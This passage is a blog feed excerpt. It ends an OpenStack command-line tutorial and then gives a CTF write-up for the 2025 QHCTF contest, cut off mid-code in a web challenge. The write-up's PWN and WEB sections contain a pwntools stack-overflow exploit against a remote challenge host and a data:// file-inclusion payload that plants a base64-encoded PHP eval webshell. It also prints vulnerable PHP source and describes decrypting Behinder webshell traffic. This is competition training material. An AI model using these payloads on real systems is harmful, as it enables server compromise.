指定物理网络名称为provider</li></ul><p>其中<code>provider</code>是在neutron的ml2模块中指定的。<br>其他参数可以参考<code> openstack network create -h</code>命令给的帮助</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack network create -h</span><br><span class="line">usage: openstack network create [-h] [-f &#123;json,shell,table,value,yaml&#125;]</span><br><span class="line">                                [-c COLUMN] [--max-width &lt;<span class="built_in">integer</span>&gt;]</span><br><span class="line">                                [--fit-width] [--print-empty] [--noindent]</span><br><span class="line">                                [--prefix PREFIX] [--share | --no-share]</span><br><span class="line">                                [--<span class="built_in">enable</span> | --<span class="built_in">disable</span>] [--project &lt;project&gt;]</span><br><span class="line">                                [--description &lt;description&gt;] [--mtu &lt;mtu&gt;]</span><br><span class="line">                                [--project-domain &lt;project-domain&gt;]</span><br><span class="line">                                [--availability-zone-hint &lt;availability-zone&gt;]</span><br><span class="line">                                [--enable-port-security | --disable-port-security]</span><br><span class="line">                                [--external | --internal]</span><br><span class="line">                                [--default | --no-default]</span><br><span class="line">                                [--qos-policy &lt;qos-policy&gt;]</span><br><span class="line">                                [--transparent-vlan | --no-transparent-vlan]</span><br><span class="line">                                [--provider-network-type &lt;provider-network-type&gt;]</span><br><span class="line">                                [--provider-physical-network &lt;provider-physical-network&gt;]</span><br><span class="line">                                [--provider-segment &lt;provider-segment&gt;]</span><br><span class="line">                                [--dns-domain &lt;dns-domain&gt;]</span><br><span class="line">                                [--tag &lt;tag&gt; | --no-tag]</span><br><span class="line">                                &lt;name&gt;</span><br></pre></td></tr></table></figure><p>创建vpc网络<br><code>openstack network create --project cec --provider-network-type vxlan cec-vpc</code></p><h2 id="创建子网"><a href="#创建子网" class="headerlink" title="创建子网"></a>创建子网</h2><p>参考命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令如下</span></span><br><span class="line"> openstack subnet create cec-subnet --network cec-vpc --subnet-range 172.16.2.0/24 --allocation-pool start=172.16.2.1,end=172.16.2.253 --gateway 172.16.2.254 --dns-nameserver 223.5.5.5</span><br><span class="line"><span class="comment"># 注解如下</span></span><br><span class="line">openstack subnet create --network 指定网络名称 --allocation-pool start=分配起始ip,end=结束分配ip --dns-nameserver 分配的dns主机 --gateway 网关 --subnet-range 网络地址 名字</span><br></pre></td></tr></table></figure><h2 id="创建路由"><a href="#创建路由" class="headerlink" title="创建路由"></a>创建路由</h2><p>执行<code>openstack router create --project cec cec-router</code>命令在<code>cec</code>项目中创建一个路由<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250207123321.png"></p><h2 id="关联路由出口网络"><a href="#关联路由出口网络" class="headerlink" title="关联路由出口网络"></a>关联路由出口网络</h2><p>执行<code>openstack router set cec-router --external-gateway provider</code>命令设置<code>cec-router</code>路由的外部出口接口为<code>provider</code>网络,执行下面命令成功是无回显的。这条命令是不支持<code>--project</code>指定项目的，如果多个项目中都有这个名字，可以使用<code>openstack project set &lt;project_name&gt;</code>来切换项目，或者更新<code>openrc</code>验证脚本的<code>OS_PROJECT_NAME</code>参数</p><h2 id="关联路由内部网络"><a href="#关联路由内部网络" class="headerlink" title="关联路由内部网络"></a>关联路由内部网络</h2><p>执行<code>openstack router add subnet cec-router cec-subnet</code>关联路由的内部网络，这条命令是不支持<code>--project</code>指定项目的，如果多个项目中都有这个名字，可以更新<code>openrc</code>验证脚本的<code>OS_PROJECT_NAME</code>参数。</p><h1 id="安全组管理"><a href="#安全组管理" class="headerlink" title="安全组管理"></a>安全组管理</h1><h2 id="安全组列出"><a href="#安全组列出" class="headerlink" title="安全组列出"></a>安全组列出</h2><p>通过<code>openstack security group list</code>命令列出所有安全组<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250207125916.png"></p><h2 id="安全组创建"><a href="#安全组创建" class="headerlink" title="安全组创建"></a>安全组创建</h2><p>通过<code>openstack security group create --project cec cec-sg</code>命令在<code>cec</code>项目中创建一个名为<code>cec-sg</code>的安全组<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250207125932.png"></p><h2 id="安全组规则创建"><a href="#安全组规则创建" class="headerlink" title="安全组规则创建"></a>安全组规则创建</h2><p>通过<code>openstack security group rule create --project cec --proto tcp --dst-port 22:22 cec-sg</code>命令来放行<code>cec</code>项目中的<code>cec-sg</code>安全组的22端口<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250207130243.png"></p><h1 id="虚机管理"><a href="#虚机管理" class="headerlink" title="虚机管理"></a>虚机管理</h1><h2 id="规格列出"><a href="#规格列出" class="headerlink" title="规格列出"></a>规格列出</h2><p>执行<code>openstack flavor list</code>命令列出实例规格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack flavor list</span><br><span class="line">+----+---------+-----+------+-----------+-------+-----------+</span><br><span class="line">| ID | Name    | RAM | Disk | Ephemeral | VCPUs | Is Public |</span><br><span class="line">+----+---------+-----+------+-----------+-------+-----------+</span><br><span class="line">| 0  | m1.nano |  64 |    1 |         0 |     1 | True      |</span><br><span class="line">+----+---------+-----+------+-----------+-------+-----------+</span><br></pre></td></tr></table></figure><h2 id="规格创建"><a href="#规格创建" class="headerlink" title="规格创建"></a>规格创建</h2><p>通过命令<code>openstack flavor create n1.nano --vcpus 1 --ram 128 --disk 1</code>创建一个名字为<code>n1.nano</code> cpu数量为<code>1</code> 内存为<code>128m</code> 磁盘为<code>1G</code>的实例规格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack flavor create n1.nano --vcpus 1 --ram 128 --disk 1</span><br><span class="line">+----------------------------+--------------------------------------+</span><br><span class="line">| Field                      | Value                                |</span><br><span class="line">+----------------------------+--------------------------------------+</span><br><span class="line">| OS-FLV-DISABLED:disabled   | False                                |</span><br><span class="line">| OS-FLV-EXT-DATA:ephemeral  | 0                                    |</span><br><span class="line">| disk                       | 1                                    |</span><br><span class="line">| <span class="built_in">id</span>                         | bf316702-0183-46ea-8a6c-5a8678f17d7d |</span><br><span class="line">| name                       | n1.nano                              |</span><br><span class="line">| os-flavor-access:is_public | True                                 |</span><br><span class="line">| properties                 |                                      |</span><br><span class="line">| ram                        | 128                                  |</span><br><span class="line">| rxtx_factor                | 1.0                                  |</span><br><span class="line">| swap                       |                                      |</span><br><span class="line">| vcpus                      | 1                                    |</span><br><span class="line">+----------------------------+--------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="创建虚机"><a href="#创建虚机" class="headerlink" title="创建虚机"></a>创建虚机</h2><p>使用<code>openstack server create --flavor n1.nano --image cirros --nic net-id=cec-vpc --security-group cec-sg cec-vm01</code>命令创建一个规格为<code>n1.nano</code> 镜像为<code>cirros</code> 网络为<code>cec-vpc</code> 安全组为<code>cec-sg</code> 名为<code>cec-vm01</code>的虚机<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250207131046.png"></p><h2 id="列出虚机"><a href="#列出虚机" class="headerlink" title="列出虚机"></a>列出虚机</h2><p>通过<code>openstack server list</code>命令列出当前项目下的虚机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack server list</span><br><span class="line">+--------------------------------------+----------+--------+---------------------+--------+---------+</span><br><span class="line">| ID                                   | Name     | Status | Networks            | Image  | Flavor  |</span><br><span class="line">+--------------------------------------+----------+--------+---------------------+--------+---------+</span><br><span class="line">| 965bc540-28b9-45a9-9130-b1f6a94d11cd | cec-vm01 | ACTIVE | cec-vpc=172.16.2.44 | cirros | n1.nano |</span><br><span class="line">+--------------------------------------+----------+--------+---------------------+--------+---------+</span><br></pre></td></tr></table></figure><h2 id="创建浮动IP"><a href="#创建浮动IP" class="headerlink" title="创建浮动IP"></a>创建浮动IP</h2><p>通过<code>openstack floating ip create provider</code>命令创建一个浮动ip，<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250207131712.png"></p><h2 id="关联浮动ip给虚机"><a href="#关联浮动ip给虚机" class="headerlink" title="关联浮动ip给虚机"></a>关联浮动ip给虚机</h2><p>通过<code>openstack server add floating ip cec-vm01 10.0.0.204</code>命令给主机<code>cec-vm01</code>关联<code>10.0.0.204</code>的浮动ip，如果不指定ip直接执行则会从浮动ip中随机拿一条给他用。这条命令执行成功是无回显的。</p><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><p><code>OpenStack</code>的命令有很多很多，这里无法一一的去做讲解，而是在实战中使用学习，这里只是说了些常用的，还有一些删除增加查看这里可能没说，基本上就是<code>openstack 类别 list|create|delete|show</code>来去管理这些内容。</p>]]></content>
    
    
    <summary type="html">身份验证
1
2
3
4
5
6
7


export OS_USERNAME=admin
export OS_PASSWORD=ADMIN_PASS
export OS_PROJECT_NAME=admin
export OS_USER_DOMAIN_NAME=Default
export OS_PROJECT_DOMAIN_NAME=Default
export OS_AUTH_URL=http://controller:5000/v3
export OS_IDENTITY_API_VERSION=3


项目管理
帮助信息
1
2
3
4
5
6
7
8


[root@controll</summary>
    
    
    
    <category term="虚拟化平台" scheme="https://blog.boychai.xyz/categories/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0/"/>
    
    
    <category term="开源工具" scheme="https://blog.boychai.xyz/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
    <category term="OpenStack" scheme="https://blog.boychai.xyz/tags/OpenStack/"/>
    
    <category term="Stein" scheme="https://blog.boychai.xyz/tags/Stein/"/>
    
  </entry>
  
  <entry>
    <title>2025第一届“启航杯”网络安全挑战赛-WriteUp</title>
    <link href="https://blog.boychai.xyz/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/"/>
    <id>https://blog.boychai.xyz/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/</id>
    <published>2025-01-26T19:02:00.000Z</published>
    <updated>2025-07-17T05:40:18.597Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://image.boychai.xyz/article/25-qihang-chengji.png"><br>最终排名19，22道题目，20解，一道社工的<code>你猜猜这是哪</code>和取证的<code>Win_06</code>没解出来，题目质量并不高。其中逆向、密码均为<code>wheeler</code>大佬提供的wp，猿类的语言的wp为<code>beginner</code>大佬提供。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="QHCTF-For-Year-2025"><a href="#QHCTF-For-Year-2025" class="headerlink" title="QHCTF For Year 2025"></a>QHCTF For Year 2025</h2><p>根据提示画图<code>080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609021725181104-01020917233029</code><br><img src="https://image.boychai.xyz/article/cdff51d8824765572d36cae578564d4.png"><br>FLAG为<code>QHCTF&#123;FUN&#125;</code></p><h2 id="启动！"><a href="#启动！" class="headerlink" title="______启动！"></a>______启动！</h2><p>挨个查看了一下流量，基本上都是加密的，最有线索的是流135，很像是webshell的流量，但是最终返回的是403，自己解密拿不到内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125211946.png"><br>感觉像是冰蝎的流量，通过<code>PuzzleSolver</code>解密出下面内容，他是冰蝎4的流量<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125212422.png"><br>通过豆包解密<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125213511.png"><br>flag为<code>QHCTF&#123;69b62b46-de2f-4ac2-81f7-234613d25cfb&#125;</code></p><h2 id="你能看懂这串未知的文字吗"><a href="#你能看懂这串未知的文字吗" class="headerlink" title="你能看懂这串未知的文字吗"></a>你能看懂这串未知的文字吗</h2><p>翻了好多，找到一个差不多的，羊文<br><img src="https://image.boychai.xyz/article/cd276cdc6c71e3a6e9a19cd11d59e4e.png">解密拿到内容<code>szfpguwizgwesqzoaoerv</code>,直接提交是失败的，继续从图片中找内容，发现有一个lsb隐写<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125213815.png"><br>拿到lsb的字符串<code>qihangbeiiseasy</code>，之后使用维吉尼亚密码尝试解密拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125213937.png"><br><code>cryptoveryeasybysheep</code>,在羊文图中后面有三个<code>!</code>,加上即可<br>flag为<code>QHCTF&#123;cryptoveryeasybysheep!!!&#125;</code></p><h2 id="请找出拍摄地所在位置"><a href="#请找出拍摄地所在位置" class="headerlink" title="请找出拍摄地所在位置"></a>请找出拍摄地所在位置</h2><p>图片内如如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125214124.png"><br>根据可用信息<code>绿源</code>、<code>雅迪</code>、<code>洋丰复合肥</code>、<code>柳化复合肥</code>去地图中挨个找。<br>找到下面地址<code>https://j.map.baidu.com/74/OpSi</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125214436.png"><br>flag为<code>QHCTF&#123;广西壮族自治区柳州市柳城县榕泉路与六广路交叉口&#125;</code></p><h2 id="PvzHE"><a href="#PvzHE" class="headerlink" title="PvzHE"></a>PvzHE</h2><p>纸老虎，直接按日期排序，最早的图片中就有flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222853.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222857.png"></p><h2 id="猿类的编程语言你了解吗"><a href="#猿类的编程语言你了解吗" class="headerlink" title="猿类的编程语言你了解吗"></a>猿类的编程语言你了解吗</h2><p><img src="https://image.boychai.xyz/article/2ce8f40c86e37733b195c277b71db74.png"><br>用工具jphs出了，原来的其他隐写工具没出来<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223556.png"><br>seek后出来一个okk码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223621.png"><br>解密拿到flag</p><h2 id="你猜猜我在哪"><a href="#你猜猜我在哪" class="headerlink" title="你猜猜我在哪"></a>你猜猜我在哪</h2><p><img src="https://image.boychai.xyz/article/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250126193202.png"><br>赛后公布的flag<br><code>QHCTF&#123;湖南省郴州市汝城县滨河大道与神农大道交叉路口&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h2><p>RSA签到题难度，给了公钥与私钥，直接解即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">private_key = key.export_key()</span><br><span class="line">public_key = key.publickey().export_key()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;私钥:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;公钥:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">message, public_key</span>):</span><br><span class="line">    key = RSA.import_key(public_key)</span><br><span class="line">    cipher = PKCS1_OAEP.new(key)</span><br><span class="line">    encrypted_message = cipher.encrypt(message.encode())</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_message).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;Hello, this is a secret message!&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted = encrypt_message(message, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的消息:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">b&#x27;-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQDDe2nPHYHbOm8UeieE0c2Dd8Avd7XEk3+Gi81rDkaRfbj9bNsP\n4TzkaY8VLTLuk36W6FQOowkfekbWxIx0jxNrhN2K+F5o4HQvyVDY/t14HYrWFR3c\nYo8abbrHc4RlEnxvyKlS8hlw1sPwXYvicVYE27Vdq3J7Y4VVZ8tWtBLuaQIDAQAB\nAoGAI5BJUK/qlwrLeKs8k1JkFD3uDfS2cfvvoHfAuHBRcFiyFhD+zaXJoTh/Gngt\nou/cgPHlkQAiQcLKLnp1nyMEgiK1NNwAtroS8lm1K4AZ3ltIKgqq4cnQSuFDDXZB\nw96P+DCkjI1hSRE+/TZ7cN9SllCVj6tS1Y7V76sMPNEoH80CQQDfBqSkGPWZm9zQ\nNVnrIizeEhz/aa7LJeYxirmkQy2X7Hs0vB2Y30a7ICU4LwnT+9ugFLM2mmpgrjLh\nVKN/uHL7AkEA4GJBqavJktwYCtTUnLWYIfsGMO5KZAdjZS1wvea2miZYJc6Qn61p\najON4PaSWEUQEKqk+9fwrsU3lrglmBaG6wJAE8IU5+zGJVunjlKLqscWTn4wT3hf\nYePzpsPxelnxOhpbN+rKfHabX4yTf4y7RCp15JKw5c98SSBlpYzIB1Kh7QJBANwW\nREXCZFMSYtqs62ZSkEg0SlxQPtNik9G4Am+iDtWgarGarSySEWXD75QLBnxiMWHH\nn1AO/NrQQrgpI2bMIcUCQQCI5JQzp8FmyjjOsrJiwT0NWiTdko6qMCZ4LEFMY0s8\nGylIRw11S0K+dU0LI4Xs92AxuA1BPN25KMGmwvxtWmPR\n-----END RSA PRIVATE KEY-----&#x27;</span></span><br><span class="line">public_key = <span class="string">b&#x27;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDe2nPHYHbOm8UeieE0c2Dd8Av\nd7XEk3+Gi81rDkaRfbj9bNsP4TzkaY8VLTLuk36W6FQOowkfekbWxIx0jxNrhN2K\n+F5o4HQvyVDY/t14HYrWFR3cYo8abbrHc4RlEnxvyKlS8hlw1sPwXYvicVYE27Vd\nq3J7Y4VVZ8tWtBLuaQIDAQAB\n-----END PUBLIC KEY-----&#x27;</span></span><br><span class="line">cip = <span class="string">b&quot;v1XpEQbLRdiqwgZXbn0xBNQ7kjCD3MgwbJa+ZQUmpPz++ZFw3FGjUKL140Rqceukiwq44xGy3ZqRfPZHRg7KISN/544dWq4rHcOx4I087oTYrHVjESsBJMxnpSuBNB6jEQVcPRapDlitHsNdkphIr24cwstzLzwcf1ORpWYDugg=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">encrypted_message, pri_key</span>):</span><br><span class="line">    message = base64.b64decode(encrypted_message)</span><br><span class="line">    key = RSA.import_key(pri_key)</span><br><span class="line">    cipher = PKCS1_OAEP.new(key)</span><br><span class="line">    ming = cipher.decrypt(message)</span><br><span class="line">    <span class="keyword">return</span> ming</span><br><span class="line"></span><br><span class="line">m = decrypt_message(cip,private_key)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Easy-pwn"><a href="#Easy-pwn" class="headerlink" title="Easy_pwn"></a>Easy_pwn</h2><p>经典栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># sh = process(&quot;./pwn1&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;154.64.245.108&quot;</span>,<span class="number">33275</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">back_door = <span class="number">0x0000000004011C6</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>  + p64(ret) + p64(back_door)</span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;Welcome to QHCTF 2025!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h2><p>就一异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cip = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;726B607765584646154014411A400E461445160E174542410E1A4147450E4642131446131017451542165E&quot;</span>)</span><br><span class="line">cip = <span class="built_in">bytearray</span>(cip)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cip)):</span><br><span class="line">    cip[i] ^= <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cip))</span><br></pre></td></tr></table></figure><h2 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h2><p>就一异或 x2<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223120.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cip = <span class="built_in">bytearray</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cip)):</span><br><span class="line">    cip[i] ^= <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cip))</span><br></pre></td></tr></table></figure><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>去下载最新版 upx来对note进行脱壳<br><a href="https://github.com/upx/upx/releases/tag/v4.2.4">https://github.com/upx/upx/releases/tag/v4.2.4</a><br><code>brva 0x0000000000012A8</code> 下断点，即可看到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223211.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223215.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$file</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;no no no ~ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过payload<code>?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyA/Pg==</code><br>构造一个一句话木马，直接通过蚁剑连接即可，因为是动态flag这里不多写了。</p><h2 id="PCREMagic"><a href="#PCREMagic" class="headerlink" title="PCREMagic"></a>PCREMagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?php.*?eval.*?\(.*?\).*?\?&gt;/is&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_dir</span> = <span class="string">&#x27;data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span 